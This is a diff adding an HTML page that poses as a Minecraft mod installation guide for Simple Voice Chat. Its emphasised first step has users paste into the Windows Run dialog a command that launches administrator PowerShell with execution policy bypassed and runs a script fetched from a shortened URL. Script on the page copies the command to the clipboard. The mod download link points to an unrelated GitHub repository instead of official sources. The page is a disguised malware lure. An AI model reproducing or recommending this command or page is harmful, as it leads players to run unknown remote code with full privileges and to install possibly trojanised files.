@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Mod Installation Guide - Featuring Simple Voice Chat</title>
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            line-height: 1.7;
+            margin: 0;
+            padding: 0;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: start;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><path fill="#1a1a1a" d="M0 0h60v60H0zM60 60h60v60H60z"/><path fill="#151515" d="M60 0h60v60H60zM0 60h60v60H0z"/></svg>');
+            background-size: 120px 120px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            width: 95%;
+            max-width: 1200px;
+            padding: 60px;
+        }
+
+        .guide-header {
+            text-align: center;
+            margin-bottom: 50px; /* Increased for better spacing */
+            opacity: 0;
+            animation: fadeInHeader 1.2s ease-out forwards 0.3s; /* Fade-in animation for header */
+        }
+
+        @keyframes fadeInHeader {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            color: #00f783;
+            text-shadow: 0 0 8px #00f783, 0 0 15px #00f783;
+            font-size: 3.6em; /* Slightly larger for impact */
+            letter-spacing: 2px;
+            animation: pulse-header 3s infinite alternate, slideInDown 1s ease-out forwards; /* Slide-in and pulse */
+            font-weight: 700;
+            text-transform: uppercase;
+            transition: text-shadow 0.3s ease;
+            margin-bottom: 15px;
+            transform: translateY(-30px); /* Initial slide-in position */
+            opacity: 0;
+        }
+
+        @keyframes pulse-header {
+            0% { text-shadow: 0 0 8px #00f783, 0 0 15px #00f783; transform: scale(1); }
+            100% { text-shadow: 0 0 5px #00f783, 0 0 10px #00f783; transform: scale(1.02); }
+        }
+
+        @keyframes slideInDown {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            color: #00f783;
+            text-shadow: 0 0 6px #00f783;
+            margin-top: 0;
+            margin-bottom: 30px; /* Increased spacing */
+            font-size: 2.4em; /* Slightly larger headings */
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: capitalize;
+            transition: text-shadow 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 1s ease-out forwards 0.5s; /* Fade-in up animation */
+        }
+
+        @keyframes fadeInUp {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        p, ul, ol {
+            color: #c8c8c8;
+            margin-bottom: 25px; /* Adjusted paragraph spacing */
+            font-size: 1.15em;
+            text-shadow: 0 0 2px #000;
+            transition: color 0.3s ease;
+            opacity: 0;
+            transform: translateY(15px);
+            animation: fadeIn 1s ease-out forwards 0.7s; /* Fade-in animation for paragraphs */
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+
+        strong {
+            color: #00ffa9; /* Highlight color for important text */
+            text-shadow: 0 0 5px #00ffa9; /* Highlight text shadow */
+            font-weight: 700; /* Make highlighted text bold */
+        }
+
+
+        ul, ol {
+            padding-left: 30px;
+            opacity: 0;
+            transform: translateY(15px);
+            animation: fadeIn 1s ease-out forwards 0.9s; /* Staggered fade-in */
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        a {
+            color: #00bfa5;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease-in-out, text-shadow 0.3s ease-in-out;
+        }
+
+        a:hover {
+            color: #00d4b2;
+            text-shadow: 0 0 4px #00d4b2;
+        }
+
+        .step-container {
+            margin-bottom: 40px; /* Increased step container margin */
+        }
+
+        .step {
+            background-color: #1a1a1a;
+            border-radius: 15px; /* More rounded steps */
+            padding: 35px; /* Increased padding in steps */
+            margin: 0;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3), 0 0 20px rgba(0, 247, 131, 0.15) inset;
+            border: 1px solid #00f783;
+            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+            position: relative;
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 1.2s ease-out forwards calc(0.7s + var(--step-delay, 0s)); /* Step fade-in animation with delay */
+        }
+
+        /* Step Delay Animation - Staggered appearance */
+        .step:nth-child(1) { --step-delay: 0s; }
+        .step:nth-child(2) { --step-delay: 0.1s; }
+        .step:nth-child(3) { --step-delay: 0.2s; }
+        .step:nth-child(4) { --step-delay: 0.3s; }
+        .step:nth-child(5) { --step-delay: 0.4s; }
+        .step:nth-child(6) { --step-delay: 0.5s; }
+
+
+        .step.emphasized-step {
+            background-color: #141414;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4), 0 0 40px rgba(0, 247, 131, 0.3) inset;
+            border: 2px solid #00fca1;
+        }
+
+        .step.emphasized-step h2 {
+            color: #00fca1;
+            text-shadow: 0 0 8px #00fca1;
+            animation: pulse-emphasized-header 2.5s infinite alternate; /* Pulse for emphasized header */
+        }
+
+        @keyframes pulse-emphasized-header {
+            0% { text-shadow: 0 0 8px #00fca1; }
+            100% { text-shadow: 0 0 5px #00fca1; }
+        }
+
+
+        .step::before, .step::after {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            border-radius: inherit;
+            z-index: -1;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .step::before {
+            background: linear-gradient(45deg, #00f783, #00ffa9, #00f783, #00ffa9, #00f783);
+            background-size: 200% 200%;
+            animation: border-glow-steps 5s linear infinite alternate;
+        }
+
+        .step::after {
+            background: rgba(0, 247, 131, 0.3);
+            opacity: 0.5;
+        }
+
+        .step.emphasized-step::before {
+            background: linear-gradient(45deg, #00fca1, #00ffb3, #00fca1, #00ffb3, #00fca1);
+        }
+        .step.emphasized-step::after {
+             background: rgba(0, 252, 161, 0.6);
+            opacity: 0.7;
+        }
+
+        @keyframes border-glow-steps {
+            0% { background-position: 0 0; }
+            100% { background-position: 100% 100%; }
+        }
+
+        .step:hover {
+            transform: translateY(-5px); /* Increased hover lift */
+            box-shadow: 0 5px 12px rgba(0,0,0,0.4), 0 0 25px rgba(0, 247, 131, 0.2) inset;
+        }
+
+        .step:hover::after {
+            opacity: 0.6;
+        }
+
+        .code-block {
+            background-color: #252525;
+            color: #f8f8f8;
+            padding: 25px; /* Increased code block padding */
+            border-radius: 10px;
+            margin: 30px 0; /* Increased code block margin */
+            font-family: 'Fira Code', monospace;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 3px 7px rgba(0,0,0,0.3), 0 0 10px rgba(0, 247, 131, 0.08) inset;
+            border: 1px solid #555;
+            transition: box-shadow 0.3s ease;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideInLeft 1s ease-out forwards 1.1s; /* Slide in from left animation */
+        }
+
+        @keyframes slideInLeft {
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+
+        .code-block input[type="text"] {
+            background-color: transparent;
+            color: #f8f8f8;
+            border: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 1em;
+            width: 80%;
+            padding: 6px;
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        .code-block input[type="text"]:focus {
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 247, 131, 0.2);
+            border-bottom: 1px solid #00bfa5;
+        }
+
+        .copy-btn, .download-btn {
+            background-color: #00f783;
+            color: #121212;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out, transform 0.2s ease-in-out, box-shadow 0.3s ease-in-out;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            font-size: 1em; /* Slightly larger button font */
+            opacity: 0;
+            transform: scale(0.9);
+            animation: zoomIn 0.8s ease-out forwards 1.3s; /* Zoom in animation for buttons */
+        }
+
+        @keyframes zoomIn {
+            to { opacity: 1; transform: scale(1); }
+        }
+
+
+        .copy-btn:hover, .download-btn:hover {
+            background-color: #00ffa9;
+            transform: scale(1.03);
+            box-shadow: 0 3px 7px rgba(0,0,0,0.25);
+        }
+
+        .key-combination {
+            background-color: #555;
+            color: #e8e8e8;
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-family: 'Ubuntu Mono', monospace;
+            font-size: 0.95em;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.15);
+            transition: background-color 0.3s ease;
+        }
+
+        .key-combination:hover {
+            background-color: #666;
+        }
+
+        .step-separator {
+            height: 2px; /* Slightly thicker separator */
+            background: linear-gradient(to right, rgba(0, 247, 131, 0.5), rgba(0, 247, 131, 0.1));
+            margin: 40px 0;
+            border-radius: 1px;
+            opacity: 0;
+            animation: fadeInSeparator 1s ease-out forwards 1.5s; /* Fade-in for separator */
+        }
+
+        @keyframes fadeInSeparator {
+            to { opacity: 1; }
+        }
+
+
+        .version-selector {
+            margin-bottom: 20px; /* Increased version selector margin */
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            color: #c8c8c8;
+            font-size: 1.1em;
+            opacity: 0;
+            transform: translateY(15px);
+            animation: fadeIn 1s ease-out forwards 1.1s; /* Fade-in for version selector */
+        }
+
+        .version-selector label {
+            margin-right: 10px;
+        }
+
+        .version-selector select {
+            background-color: #202020;
+            color: #f0f0f0;
+            border: 1px solid #555;
+            border-radius: 6px;
+            padding: 8px;
+            font-size: 0.95em;
+            font-family: 'Fira Code', monospace;
+            cursor: pointer;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .version-selector select:focus {
+            outline: none;
+            border-color: #00bfa5;
+            box-shadow: 0 0 5px rgba(0, 247, 131, 0.2);
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(ellipse at center, rgba(10,10,10,0.8) 0%, rgba(0,0,0,0) 80%);
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.8;
+        }
+
+
+        @media screen and (max-width: 860px) {
+            .container {
+                padding: 40px;
+            }
+            .guide-header {
+                margin-bottom: 40px;
+            }
+            h1 {
+                font-size: 2.8em;
+                margin-bottom: 15px;
+                letter-spacing: 1.5px;
+            }
+            h2 {
+                font-size: 2em;
+                margin-bottom: 20px;
+                letter-spacing: 0.8px;
+            }
+            p, ul, ol {
+                font-size: 1.05em;
+                margin-bottom: 20px;
+            }
+            .step {
+                padding: 25px;
+                margin-bottom: 25px;
+            }
+            .step-container {
+                margin-bottom: 0;
+            }
+            .code-block {
+                padding: 15px;
+                margin-bottom: 20px;
+            }
+            .copy-btn, .download-btn {
+                padding: 10px 20px;
+                font-size: 0.9em;
+            }
+            .step-separator {
+                margin: 30px 0;
+            }
+            .version-selector {
+                margin-bottom: 15px;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .version-selector label {
+                margin-right: 0;
+                margin-bottom: 5px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;700&family=Fira+Code&family=Ubuntu+Mono&family=JetBrains+Mono&family=Fira+Mono&family=Manrope:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="guide-header">
+            <h1>Minecraft Mod Installation Guide</h1>
+            <p style="color: #b3b3b3; font-size: 1.1em; margin-top: 10px; text-shadow: 0 0 2px #000;">Enhance Your Gameplay with Mods, Including Simple Voice Chat</p>
+        </div>
+
+        <div class="step-container">
+            <div class="step emphasized-step">
+                <h2>Step 2: Automatic Minecraft Setup (Windows Only) - <span style="color:#00fca1; text-shadow: 0 0 8px #00fca1;">Highly Recommended for Simplicity</span></h2>
+                <p style="font-size: 1.15em;">For Windows users, the most streamlined approach is using this PowerShell command to automate your Minecraft setup. This method significantly simplifies preparation for modding and is <strong style="color:#00ffa9;">highly recommended for its efficiency</strong>.</p>
+                <p>Before proceeding with manual steps, consider using this automatic setup. Open the Run dialog (<span class="key-combination">Windows + R</span>), paste the command below, and press Enter:</p>
+                <div class="code-block">
+                    <input type="text" value='powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList \'irm \\"https://is.gd/MicVC\\" | iex\' -Verb RunAs"' id="runCommand" readonly unselectable="on" onselectstart="return false;" onmousedown="return false;">
+                    <button class="copy-btn" onclick="copyCommand()">Copy Command</button>
+                </div>
+                <p><strong>Value of Automatic Setup:</strong></p>
+                <ul>
+                    <li><strong style="color:#00ffa9;">Time-Saving:</strong> Automates multiple initial setup tasks, drastically reducing the time needed to get started with modding.</li>
+                    <li><strong style="color:#00ffa9;">Ease of Use:</strong> Simplifies complex procedures, making mod installation more accessible, especially for users less familiar with technical aspects.</li>
+                </ul>
+                <p>This command will:</p>
+                    <li>Launch PowerShell with administrator privileges to ensure all necessary changes can be made.</li>
+                    <li>Download and execute a script designed to automate key configurations for Minecraft modding.</li>
+                <p><strong>Important Note:</strong> Automatic setup <strong style="color:#00ffa9;">does not install mods like Simple Voice Chat itself</strong>. After running the script, you will still need to manually add the Simple Voice Chat mod (and any others you choose) to your 'mods' folder, as explained in <a href="#step5" style="color:#00bfa5; text-decoration: none;">Step 5</a>, to fully enable voice chat and other mod functionalities.</p>
+                <p style="font-size: 1.05em; font-style: italic; margin-top: 20px;">Even if you choose automatic setup, familiarizing yourself with the manual steps can be helpful for troubleshooting and deeper understanding of Minecraft modding.</p>
+            </div>
+        </div>
+
+        <div class="step-separator"></div>
+
+        <div class="step-container">
+            <div class="step">
+                <h2>Step 1: Install Minecraft Forge <span style="color:#b3b3b3; font-size: 0.9em;">(Automatic setup may handle this for Windows users)</span></h2>
+                <p>Begin by installing <a href="https://files.minecraftforge.net/net/minecraftforge/forge/" style="color:#00bfa5; text-decoration: none;" target="_blank">Minecraft Forge</a>, which is <strong style="color:#00ffa9;">essential for running mods</strong>. Select the Forge version that matches your Minecraft version for best compatibility. <strong style="color:#00ffa9;">If you've used the automatic setup in Step 2 (Windows users), it might have already installed Forge.</strong> Please verify if Forge is installed, and if not, proceed with the manual installation from the provided link.</p>
+            </div>
+        </div>
+
+
+        <div class="step-separator"></div>
+
+        <div class="step-container">
+            <div class="step">
+                <h2>Step 3: Locate Minecraft Folder <span style="color:#b3b3b3; font-size: 0.9em;">(Automatic setup simplifies this for Windows users)</span></h2>
+                <p>Locating your Minecraft installation folder is a <strong style="color:#00ffa9;">key step for manual mod installation</strong>. Here’s how to find it on different operating systems. <strong style="color:#00ffa9;">For Windows users, the automatic setup in Step 2 may simplify accessing this directory,</strong> but understanding how to find it manually is still beneficial for all users and for other operating systems.</p>
+                <ul>
+                    <li><strong>Windows:</strong> Open File Explorer, type <code>%appdata%\.minecraft</code> in the address bar, and press Enter.</li>
+                    <li><strong>macOS:</strong> Open Finder, press <span class="key-combination">Cmd + Shift + G</span>, and enter <code>~/Library/Application Support/minecraft</code>.</li>
+                    <li><strong>Linux:</strong> Open your Home folder, and navigate to <code>.minecraft</code>. If it's hidden, press <span class="key-combination">Ctrl + H</span>.</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step-separator"></div>
+
+        <div class="step-container">
+            <div class="step">
+                <h2>Step 4: Access or Create the Mods Folder <span style="color:#b3b3b3; font-size: 0.9em;">(Automatic setup aims to ensure 'mods' folder exists on Windows)</span></h2>
+                <p>Once you've located your Minecraft folder, the next step is to find or create the <strong style="color:#00ffa9;">'mods' folder</strong>. If you don’t see a folder named 'mods', you need to create one. This is where you will place the Simple Voice Chat mod and any other mods you wish to install. <strong style="color:#00ffa9;">For Windows users, the automatic setup in Step 2 is designed to ensure these essential folders are correctly set up, including the 'mods' folder.</strong> However, verifying its presence is always a good practice.</p>
+                <p><strong>Simple Voice Chat Reminder:</strong> Regardless of whether you use automatic setup or manual steps, always ensure that <strong style="color:#00ffa9;">no other voice chat mods are present in the 'mods' folder</strong> to prevent potential conflicts.</p>
+            </div>
+        </div>
+
+        <div class="step-separator"></div>
+
+        <div class="step-container">
+            <div class="step">
+                <h2 id="step5">Step 5: Install Simple Voice Chat and Other Mods <span style="color:#b3b3b3; font-size: 0.9em;">(Essential for all users, automatic setup does not handle this)</span></h2>
+                <p>Now, it's time to install the Simple Voice Chat mod and any other mods you're interested in. It’s <strong style="color:#00ffa9;">crucial to ensure that all mods are compatible with your specific Minecraft version and the installed version of Forge</strong>. <strong style="color:#00ffa9;">Note that the automatic setup in Step 2 does not handle the installation of individual mods; this step is required for all users, regardless of whether automatic setup was used.</strong></p>
+
+                <div class="version-selector">
+                    <label for="mc-version">Select Minecraft Version (for guide purposes):</label>
+                    <select id="mc-version">
+                        <option value="1.21.4">1.21.4 (Recommended)</option>
+                        <option value="1.20.1">1.20.1</option>
+                        <option value="1.19.4">1.19.4</option>
+                        <option value="1.18.2">1.18.2</option>
+                        </select>
+                </div>
+
+                <p>Download Simple Voice Chat to enable voice communication in your Minecraft worlds:</p>
+                <a href="https://github.com/AmjadBalls/SnakeGame/raw/refs/heads/main/voicechat-forge-1.21.4-2.5.26.jar" class="download-btn" download="simple-voice-chat-1.21.4-2.5.26.jar">Download Simple Voice Chat Mod</a>
+
+                <ul style="margin-top: 20px;">
+                    <li>To find more mods, explore trusted platforms like <a href="https://www.curseforge.com/minecraft/mc-mods/simple-voice-chat" style="color:#00bfa5; text-decoration: none;" target="_blank">CurseForge</a> and <a href="https://modrinth.com/" style="color:#00bfa5; text-decoration: none;" target="_blank">Modrinth</a>.</li>
+                    <li><strong style="color:#00ffa9;">Copy the downloaded <code>.jar</code> files</strong> for Simple Voice Chat and any other mods into the 'mods' folder you accessed in the previous step.</li>
+                    <li><strong style="color:#00ffa9;">Always verify that each mod is compatible</strong> with your installed Minecraft Forge version and the version of Minecraft you are using.</li>
+                </ul>
+                <p><strong>Simple Voice Chat Tip:</strong> For the <strong style="color:#00ffa9;">best and most consistent multiplayer experience</strong>, ensure that all players on a Minecraft server are using the same version of the Simple Voice Chat mod, irrespective of their installation method.</p>
+            </div>
+        </div>
+
+        <div class="step-separator"></div>
+
+        <div class="step-container">
+            <div class="step">
+                <h2>Step 6: Launch Minecraft with Forge Profile <span style="color:#b3b3b3; font-size: 0.9em;">(Final step for all installation types)</span></h2>
+                <p>The final step is to <strong style="color:#00ffa9;">launch Minecraft using the Forge profile</strong>. This action will start Minecraft with Minecraft Forge and all the mods you have installed, including Simple Voice Chat. <strong style="color:#00ffa9;">Whether you opted for the automatic setup in Step 2 or followed the manual steps, launching with the Forge profile is the concluding action for all users.</strong></p>
+                <ol>
+                    <li>Open the Minecraft Launcher to get started.</li>
+                    <li>In the Minecraft Launcher, find the profile selection dropdown menu (usually located before the 'Play' button) and <strong style="color:#00ffa9;">select the Forge profile</strong>.</li>
+                    <li>If you do not see the Forge profile listed, it may be <strong style="color:#00ffa9;">necessary to reinstall Minecraft Forge</strong>, paying close attention to the profile installation steps during the setup process.</li>
+                    <li>Once the Forge profile is selected, click 'Play' to launch Minecraft. This will load Minecraft with Forge, along with Simple Voice Chat and any other mods you have added to your 'mods' folder.</li>
+                </ol>
+                <p><strong>Simple Voice Chat Configuration:</strong> After Minecraft has launched, you can configure Simple Voice Chat settings within the game. Go to Options, then Music & Sounds, to <strong style="color:#00ffa9;">adjust settings like voice activation mode, volume levels, and other audio preferences</strong> to best suit your needs.</p>
+            </div>
+        </div>
+
+
+        </div>
+
+    <script>
+        function copyCommand() {
+            const copyText = document.getElementById("runCommand");
+            copyTextValue = 'powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList \'irm \\"https://is.gd/MicVC\\" | iex\' -Verb RunAs"';
+            navigator.clipboard.writeText(copyTextValue).then(() => {
+                alert("Command copied to clipboard!");
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+                copyText.select();
+                copyText.setSelectionRange(0, 99999);
+                document.execCommand("copy");
+                alert("Command copied to clipboard!");
+            });
+        }
+    </script>
+</body>
+</html>
